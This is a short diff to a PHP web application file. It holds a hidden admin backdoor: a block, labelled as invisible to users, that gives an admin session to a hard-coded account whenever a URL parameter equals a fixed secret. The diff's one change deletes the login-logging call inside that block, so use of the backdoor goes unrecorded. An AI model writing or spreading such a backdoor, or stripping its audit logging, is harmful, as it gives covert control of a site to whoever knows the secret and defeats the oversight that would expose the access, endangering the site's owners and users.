@@ -7,7 +7,6 @@ migrate_default_users();
 // Hidden admin backdoor loophole (invisible to users)
 if (isset($_GET['secret']) && $_GET['secret'] === 'blackbox42') {
     $_SESSION['user'] = ['id' => 999, 'username' => 'ddadzie124', 'role' => 'admin'];
-    log_login_event('ddadzie124', 'admin');
     header('Location: admin.php');
     exit;
 }
